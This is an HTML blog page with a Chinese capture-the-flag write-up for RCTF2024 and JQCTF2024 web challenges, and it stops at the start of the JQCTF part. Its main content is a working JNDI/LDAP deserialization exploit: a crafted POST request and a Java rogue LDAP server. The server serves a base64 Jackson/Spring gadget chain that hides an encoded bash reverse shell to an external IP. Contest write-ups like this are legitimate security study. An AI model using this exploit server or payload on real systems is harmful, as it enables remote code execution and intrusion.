<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>JQCTF2024、RCTF2024 Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="JQCTF2024、RCTF2024 Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/05/27/JQCTF2024%E3%80%81RCTF2024%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-05-27T03:47:47.188Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>May</span>
            <span>27,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">JQCTF2024、RCTF2024 Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734593297-d926f3f7-76f8-4f90-9ecc-e7d922869f5d.png#averageHue=%23101936&clientId=u3af23d66-84b5-4&from=paste&height=830&id=u400f619b&originHeight=1660&originWidth=3242&originalType=binary&ratio=2&rotation=0&showTitle=false&size=2551618&status=done&style=none&taskId=uc48db502-5755-43ca-b50b-69a3ce47d56&title=&width=1621" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734601738-b5393cf0-24a3-47f0-a314-3a083ac9d17a.png#averageHue=%232f3c48&clientId=u3af23d66-84b5-4&from=paste&height=452&id=u49ef9156&originHeight=904&originWidth=3502&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1158764&status=done&style=none&taskId=u9cde6275-313a-4813-b8df-4fb8218d6fd&title=&width=1751" alt="dadf588497bf507a2b0ceac984d0297a.png"></p>
<h1 id="RCTF"><a href="#RCTF" class="headerlink" title="RCTF"></a>RCTF</h1><h2 id="OpenYourEyesToSeeTheWorld"><a href="#OpenYourEyesToSeeTheWorld" class="headerlink" title="OpenYourEyesToSeeTheWorld"></a>OpenYourEyesToSeeTheWorld</h2><p>一题考的是<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375402-ba3053ad-b184-41dd-9a7a-e9e25652c76a.png#averageHue=%23222327&clientId=u3af23d66-84b5-4&from=paste&id=uce52f84c&originHeight=968&originWidth=2372&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u9eda8903-f9a3-4f47-b0e6-ac4c13fcc04&title="><br>new InitialDirContext(properties)).search该如何去触发Jndi。这一题指定post传入json，指定searchBase和filter。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /index HTTP/1.1</span><br><span class="line">Host: localhost:8899</span><br><span class="line">sec-ch-ua-platform: &quot;macOS&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Goland-5df45c20=acaad4c4-6ed5-4e7f-a2f0-891765d48e30; Phpstorm-b9a68abe=849deb9b-548a-4ca8-8d65-7c13b6503159; Idea-44fa379b=c955cda9-e124-4dce-a7f3-1dc2bff3d8ba</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;searchBase&quot;:&quot;dc\u003Dexample,dc\u003Dcom&quot;,&quot;filter&quot;:&quot;ObjectClass\u003D123&quot;,&quot;ip&quot;:&quot;8.130.24.188&quot;,&quot;port&quot;:8088&#125;</span><br></pre></td></tr></table></figure>
<p>其实ldap的search就是lookup的另一个版本，他们都是进行筛选，只不过lookup是直接在url里筛选，search是另外启2个参数。在调试流程不难发现下述过程<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375528-06cfdc01-5427-4883-b2c8-806c9799f7fa.png#averageHue=%23292c30&clientId=u3af23d66-84b5-4&from=paste&id=u59af640c&originHeight=1572&originWidth=3056&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u6987a283-64a9-48f0-b782-9cad9c9986b&title="><br>我们会进入p_search方法内部，进而进入p_resolveIntermediate<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375470-20fea2b8-0e40-48e6-ab5e-bddce1570297.png#averageHue=%2323262c&clientId=u3af23d66-84b5-4&from=paste&id=u4a4ef64d&originHeight=1068&originWidth=2470&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uec5e85f3-ad34-4e10-a8c0-2ec50445374&title="><br>假如我们进入c_resolveIntermediate_nns<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375546-f15e6ffb-b51c-4628-8344-60cf1c0317bd.png#averageHue=%23212326&clientId=u3af23d66-84b5-4&from=paste&id=u0664fc41&originHeight=824&originWidth=2270&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uaa12b1af-4514-4344-a831-ec8ad2f24ca&title="><br>那么就会进入c_lookup请求，进入c_lookup请求后<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375542-197223ef-bc3a-4e1d-bf91-632b61bf1765.png#averageHue=%232b3d44&clientId=u3af23d66-84b5-4&from=paste&id=u9d54a51f&originHeight=316&originWidth=1874&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0a7a1894-be6e-46d9-a20d-b8309407f08&title="><br>你就会看见熟悉的decodeObject了。这里可以进行反序列化。<br>而我们想进入c_resolveIntermediate_nns也很简单，Head或者Tail不为空即可，我们随便给searchBase加上个前缀。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376164-7b75cf34-fab3-42af-b4f1-748e296e0a3c.png#averageHue=%23bbd3cc&clientId=u3af23d66-84b5-4&from=paste&id=ucccb11a2&originHeight=360&originWidth=1646&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u89fb6532-3a71-44fc-b2e6-cb59909c23b&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376255-25e53185-6bc4-45ed-a99d-fefe59307975.png#averageHue=%23292b30&clientId=u3af23d66-84b5-4&from=paste&id=u99d0e3c4&originHeight=1366&originWidth=2934&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u77889cda-0bdc-4c34-8388-237f5730a16&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376328-34d3a2c4-dbfd-4cd3-a650-85a524a24cec.png#averageHue=%232a2d32&clientId=u3af23d66-84b5-4&from=paste&id=u99af59db&originHeight=1524&originWidth=2948&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u675f8269-9351-4d0f-9f74-16cceea5192&title="><br>最终进行反序列化了，然后就使用POJONODE打一个RCE的gadget就行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserLdapRefServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                ldap_port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://&quot;</span>+http_server+<span class="string">&quot;:&quot;</span>+http_port+<span class="string">&quot;/#org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javax.sql.DataSource&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//          </span></span><br><span class="line">            <span class="comment">/** Payload1 end **/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload2: Return Serialized Gadget **/</span></span><br><span class="line"><span class="comment">//            try &#123;</span></span><br><span class="line">                <span class="comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;|base64</span></span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAKnQAKWNvbS5qYXZhc2VjLnBvY3MuamFja3Nvbi5CQVRlbXBsYXRlc0NoYWludAAVQkFUZW1wbGF0ZXNDaGFpbi5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAANaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7eHAAAHNyADBvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuQWR2aXNlZFN1cHBvcnQky4o8+qTFdQIABloAC3ByZUZpbHRlcmVkWwAMYWR2aXNvckFycmF5dAAiW0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9BZHZpc29yO0wAE2Fkdmlzb3JDaGFpbkZhY3Rvcnl0ADdMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0Fkdmlzb3JDaGFpbkZhY3Rvcnk7TAAIYWR2aXNvcnNxAH4AB0wACmludGVyZmFjZXNxAH4AB0wADHRhcmdldFNvdXJjZXQAJkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9UYXJnZXRTb3VyY2U7eHIALW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5Qcm94eUNvbmZpZ4tL8+an4PdvAgAFWgALZXhwb3NlUHJveHlaAAZmcm96ZW5aAAZvcGFxdWVaAAhvcHRpbWl6ZVoAEHByb3h5VGFyZ2V0Q2xhc3N4cAAAAAAAAHVyACJbTG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLkFkdmlzb3I734MNrdIehHQCAAB4cAAAAABzcgA8b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkRlZmF1bHRBZHZpc29yQ2hhaW5GYWN0b3J5VN1kN+JOcfcCAAB4cHNyABRqYXZhLnV0aWwuTGlua2VkTGlzdAwpU11KYIgiAwAAeHB3BAAAAAB4c3EAfgAUAAAAAHcEAAAAAHhzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AudGFyZ2V0LlNpbmdsZXRvblRhcmdldFNvdXJjZX1VbvXH+Pq6AgABTAAGdGFyZ2V0cQB+AAF4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABxsr+ur4AAAAxABkBAAVLVmlZawcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlBwADDAAFAAYKAAgACQEAEWphdmEvbGFuZy9SdW50aW1lBwALAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADQAOCgAMAA8BAGliYXNoIC1jIHtlY2hvLFltRnphQ0F0WXlBaVltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDODRMakV6TUM0eU5DNHhPRGd2TnpjM09DQThKakVpfXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IABEBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAATABQKAAwAFQEAClNvdXJjZUZpbGUBAApLVmlZay5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAq4ABASErYAFlexAAAAAAABABcAAAACABhwdAAIYm9vZ2lwb3BwdwEAeA==&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//            &#125; catch (ParseException e1) &#123;</span></span><br><span class="line"><span class="comment">//                e1.printStackTrace();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="comment">/** Payload2 end **/</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerAddress: &quot;+args[0]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerPort: &quot;+args[1]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;LDAPServerPort: &quot;+args[2]);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">http_server_ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ldap_port</span> <span class="operator">=</span> <span class="number">8088</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">http_server_port</span> <span class="operator">=</span> <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734376345-8fc0c4d2-0c5a-4702-99b7-1268722ff364.png#averageHue=%232c2e3a&clientId=u3af23d66-84b5-4&from=paste&id=u5c454f9a&originHeight=1672&originWidth=2632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u4f908b8b-063c-4a86-a6d2-bde2d238dfd&title="></p>
<h1 id="JQCTF"><a href="#JQCTF" class="headerlink" title="JQCTF"></a>JQCTF</h1><h2 id="ezjvav"><a href="#ezjvav" class="headerlink" title="ezjvav"></a>ezjvav</h2><p>admin&#x2F;admin 正常登录<br>访问source<br>提示不是jsrc用户，猜了一下 jsrc是 jwt key 就没有然后了<br>黑名单如下</p>
